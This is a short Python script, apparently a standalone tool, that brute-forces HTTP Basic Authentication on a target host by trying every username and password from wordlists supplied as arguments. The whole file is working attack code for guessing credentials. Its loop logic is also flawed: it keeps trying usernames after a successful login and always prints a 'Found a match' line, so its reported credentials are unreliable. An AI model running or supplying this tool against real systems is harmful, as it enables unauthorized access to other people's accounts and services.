#!/usr/bin/env python

"""
Very simple HTTP Basic Authentication brute force script.

"""
__author__: "an1000"



import requests
from requests.auth import HTTPBasicAuth
import argparse
import base64

parser = argparse.ArgumentParser(description='HTTP Basic Auth brute')
parser.add_argument('-U', '--user',dest="username")
parser.add_argument('-u', '--usernames',dest="usernames", type=argparse.FileType('r', encoding='UTF-8'))
parser.add_argument('-p', '--passwords', dest="passwords", required=True, type=argparse.FileType('r', encoding='UTF-8'))
parser.add_argument(dest="host", help='host to attack')
args = parser.parse_args()


def brute(host, user, passw):
	#print("Authorize:" +"Basic " + creds)
	r = requests.get(host,auth=HTTPBasicAuth(user, passw))
	return r

if args.usernames:
	u_list = args.usernames.read().splitlines()
else:
	u_list = [args.username]

p_list = args.passwords.read().splitlines()

for u in u_list:
	for p in p_list:
		print("bruting.... " + u + ":" + p)
		r = brute(args.host, u, p)
		if r.status_code == 200:
			break
print("----------------")
print("Found a match: " + u + ":" + p)

